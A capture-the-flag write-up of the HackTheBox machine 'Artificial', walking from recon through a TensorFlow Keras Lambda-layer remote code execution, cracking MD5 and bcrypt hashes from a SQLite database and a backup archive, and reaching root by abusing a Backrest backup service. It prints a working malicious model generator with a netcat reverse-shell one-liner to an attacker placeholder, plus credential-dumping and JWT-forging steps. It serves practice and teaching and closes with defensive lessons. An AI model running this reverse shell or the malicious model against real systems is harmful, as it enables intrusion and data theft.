# HackTheBox — Artificial

**Difficulty:** Easy | **OS:** Linux | **IP:** 10.129.232.51 
**Topics:** TensorFlow Keras RCE · SQLite Credential Dump · Backrest/Restic Privesc

---

## Machine Summary

| Field | Detail |
|---|---|
| Target IP | 10.129.232.51 |
| Hostname | artificial.htb |

---

## Attack Chain

```
[Recon] → [Flask Web App] → [TF Keras Lambda RCE] → [shell as app]
→ [SQLite DB] → [MD5 crack] → [SSH as gael] → [user.txt]
→ [Backrest backup archive] → [JWT forge] → [Backup /root] → [root.txt]
```

---

## Phase 1 — Reconnaissance

### Host Setup

```bash
echo '<TARGET-IP> artificial.htb' >> /etc/hosts
```

### Port Scan

```bash
nmap -Pn -p- --min-rate 5000 -sV -sC <TARGET-IP>
```

**Results:**
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    nginx 1.18.0 → redirects to http://artificial.htb/
```

Only two ports open. Nothing unusual on SSH. Focus went to the web app on port 80.

### Web Enumeration

```bash
ffuf -u http://artificial.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302
```

**Found:**
```
/login       [200]
/register    [200]
/dashboard   [302] → requires auth
/logout      [302]
```

The homepage described the app as an "AI Solutions" platform. The key giveaway was `/static/requirements.txt` and `/static/Dockerfile` being publicly accessible:

```
# requirements.txt
tensorflow-cpu==2.13.1

# Dockerfile
FROM python:3.8-slim
```

This told us:
- The backend is Python 3.8
- TensorFlow 2.13.1 is installed
- The server loads and runs uploaded `.h5` model files

The homepage even showed example Python code for saving a Keras model and uploading it. The dashboard allowed model uploads that were then executed server-side with `tf.keras.models.load_model()`.

---

## Phase 2 — Initial Access (TensorFlow Keras Lambda RCE)

### The Vulnerability

TensorFlow Keras `.h5` model files can contain `Lambda` layers — these layers execute arbitrary Python code when the model is loaded. This is documented as **CVE-2024-3660**.

When the server calls `tf.keras.models.load_model(uploaded_file)`, any Lambda layer in the model executes immediately. Since the server is running Python 3.8 with TensorFlow 2.13.1, we need to generate the exploit model using the **exact same environment**.

### Why We Needed Docker

The Lambda layer in an `.h5` file contains serialized Python bytecode, which is **version-specific**. A model built with Python 3.13 (our Kali) would fail to load on the server's Python 3.8. We used Docker with their exact Dockerfile to build the malicious model in the correct environment.

### Building the Docker Environment

```dockerfile
# Dockerfile (based on the server's own Dockerfile)
FROM python:3.8-slim
WORKDIR /code
RUN apt-get update && apt-get install -y wget
RUN wget -c --retry-connrefused --tries=10 --timeout=30 \
  "https://files.pythonhosted.org/packages/65/ad/.../tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.whl"
RUN pip install ./tensorflow_cpu-2.13.1-*.whl
ENTRYPOINT ["/bin/bash"]
```

```bash
docker build -t tf-env .
```

### Exploit Script

```python
# tf_exploit.py — generates the malicious exploit.h5
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
print("[+] exploit.h5 saved!")
```

```bash
# Run inside the Docker container to generate the .h5 with correct Python 3.8 bytecode
docker run --entrypoint bash -v "$PWD:/code" -w /code tf-env -c "python3 tf_exploit.py"
```

### What Failed Along the Way

> We tried several approaches before this worked:
> - **Manually crafting h5 files with h5py** — the model loaded but the Lambda never executed because there were no real TF weights
> - **Building the model with our local Python 3.13** — bytecode mismatch caused silent failures on the server
> - **Wrong model architecture** — the server expects Dense(64) → Dense(64) → Dense(1), deviating from this caused load errors

### Catching the Shell

```bash
# Terminal 1: listener
nc -lvnp 4444

# Terminal 2: register an account, login, upload exploit.h5, then trigger:
# POST /upload_model  (multipart, field: model_file)
# GET /run_model/<UUID>
```

**Shell received as:** `uid=1001(app) gid=1001(app)`

---

## Phase 3 — Lateral Movement (app → gael)

### Finding the SQLite Database

```bash
find /home/app -name "*.db" 2>/dev/null
# → /home/app/app/instance/users.db
```

```bash
sqlite3 /home/app/app/instance/users.db "SELECT * FROM user;"
```

**Output:**
```
1|gael|gael@artificial.htb|<md5-hash>
2|mark|mark@artificial.htb|<md5-hash>
3|robert|robert@artificial.htb|<md5-hash>
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
```

The passwords are MD5 hashes (32 hex chars, no salt).

### Cracking the Hash

```bash
hashcat -m 0 <md5-hash> /usr/share/wordlists/rockyou.txt
```

**Result:** `<md5-hash>:<cracked-password>`

### SSH Login

```bash
ssh gael@<TARGET-IP>
# Password: <cracked-password>

cat ~/user.txt
# <user flag>
```

---

## Phase 4 — Privilege Escalation (gael → root)

### Enumeration as gael

```bash
id
# uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)

sudo -l
# Sorry, user gael may not run sudo on artificial.

ss -tlnp
```

**Internal services:**
```
127.0.0.1:5000  → Flask app (the main web app)
127.0.0.1:9898  → Backrest web UI
```

```bash
find / -group sysadm 2>/dev/null
# /var/backups/backrest_backup.tar.gz
```

The `sysadm` group has read access to a backup archive containing Backrest's data — including its configuration and JWT secret.

### Extracting the Backup

```bash
mkdir -p /tmp/br2
tar -xf /var/backups/backrest_backup.tar.gz -C /tmp/br2/
find /tmp/br2 -type f
```

**Key files found:**
```
/tmp/br2/backrest/.config/backrest/config.json   ← credentials
/tmp/br2/backrest/jwt-secret                      ← JWT signing key
```

### Getting the Password Hash

```bash
cat /tmp/br2/backrest/.config/backrest/config.json
```

```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "<base64-bcrypt-hash>"
      }
    ]
  }
}
```

The `passwordBcrypt` value is **base64-encoded**:

```bash
echo '<base64-bcrypt-hash>' | base64 -d
# <bcrypt-hash>
```

### Cracking the Bcrypt Hash

```bash
echo '<bcrypt-hash>' > backrest.hash
hashcat -m 3200 backrest.hash /usr/share/wordlists/rockyou.txt --force
```

**Result:** `<bcrypt-hash>:<cracked-password>`

Password: **`<cracked-password>`**

### Getting the JWT Secret

```bash
xxd /tmp/br2/backrest/jwt-secret
```

```
<redacted bytes>
<redacted bytes>
<redacted bytes>
<redacted bytes>
```

We used this to forge a valid JWT and tested authentication to the Backrest API:

```bash
# Forged JWT (using PyJWT with the raw secret bytes)
TOKEN="<forged JWT token>"

curl -s -X POST 'http://127.0.0.1:9898/v1.Backrest/GetConfig' \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' -d '{}'
# → Returns config JSON ✓ (authenticated!)
```

> **Note:** We spent time trying to use SetConfig via the API to inject shell hooks, but kept hitting `modno mismatch` errors from the in-memory state vs. what we sent. The easier path was to use the web UI directly.

### Setting Up Access to the Backrest Web UI

Backrest only listens on `127.0.0.1:9898`, so we needed SSH port forwarding to access it from our browser:

```bash
# On Kali — forward localhost:9898 to the target's internal port 9898
sshpass -p '<cracked-password>' ssh -f -N -L 9898:127.0.0.1:9898 gael@<TARGET-IP>
```

Now `http://localhost:9898` in the browser tunnels through SSH to Backrest on the target.

### Exfiltrating /root via Backrest Web UI

No remote server needed. Backrest runs as root and can write to any local path, and the web UI lets you download the backup directly as a `.tar.gz`.

Log into `http://localhost:9898` with:
- **Username:** `backrest_root`
- **Password:** `<cracked-password>`

**Step 1 — Add Repository:**
- Click "Add Repo"
- URI: `/tmp/rootbackup` (a local path — Backrest writes here as root)
- Password: `123456`
- Submit

**Step 2 — Add Plan:**
- Click "Add Plan"
- Path: `/root`
- Repository: the one just created
- Schedule: disabled
- Submit

**Step 3 — Run Backup:**
- Click the plan name in the sidebar
- Click "Backup Now"
- Backrest executes the backup as root, so it reads all of `/root` including `root.txt` and SSH keys

**Step 4 — Download the Archive:**
- Click on the completed backup entry
- Expand "Snapshot Browser"
- Click the download icon to get the full `.tar.gz` archive directly to your browser

### Extracting the Flag

```bash
tar xf archive-2026-03-10-20-14-52.tar.gz
cat root/root.txt
# <root-flag>
```

The archive also contained `root/.ssh/id_rsa`, allowing direct SSH as root:

```bash
chmod 600 root/.ssh/id_rsa
ssh -i root/.ssh/id_rsa root@<TARGET-IP>
```

> **Note on rest-server:** Some writeups for this machine use a remote restic REST server running on the attacker machine as the backup target. That approach also works, but it is unnecessary overhead — using a local repo path and downloading via the Snapshot Browser is simpler and does not require any additional tooling.

---

## Summary of Key Findings

| Stage | Vulnerability | Impact |
|---|---|---|
| Initial Access | TF Keras Lambda RCE (CVE-2024-3660) | RCE as `app` |
| Lateral Movement | Plaintext SQLite DB, weak MD5 hash | SSH as `gael` |
| Privilege Escalation | Backrest running as root, readable backup archive with JWT secret | Read all of `/root` |

---

## Lessons Learned

**1. Lambda layers in .h5 models are dangerous**
TensorFlow/Keras Lambda layers execute arbitrary Python at load time. Any application that calls `load_model()` on user-supplied files is trivially exploitable. The fix is to use `safe_mode=True` in TF 2.13+ or to never load untrusted models.

**2. MD5 for passwords is dead**
All user passwords were stored as unsalted MD5. These crack near-instantly with rockyou.txt. Always use bcrypt, argon2, or scrypt.

**3. Backup tools running as root are a privesc goldmine**
Backrest (and restic in general) needs root to back up system files. This legitimate need becomes a security issue when access controls are weak — in this case, a backup of the config directory was readable by a low-privileged group, leaking the JWT secret needed to authenticate.

**4. JWT secrets must be protected**
The JWT secret in `/opt/backrest/jwt-secret` was root-only, but a backup of it ended up in `/var/backups/backrest_backup.tar.gz` which was group-readable. Backups of sensitive files need the same access controls as the originals.

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning |
| ffuf | Web directory enumeration |
| Docker | Build TF 2.13.1 / Python 3.8 exploit environment |
| TensorFlow | Generate malicious .h5 model |
| netcat | Catch reverse shell |
| sqlite3 | Dump user credentials |
| hashcat | Crack MD5 and bcrypt hashes |
| PyJWT | Forge Backrest authentication JWT |
| SSH port forwarding | Access internal Backrest web UI |
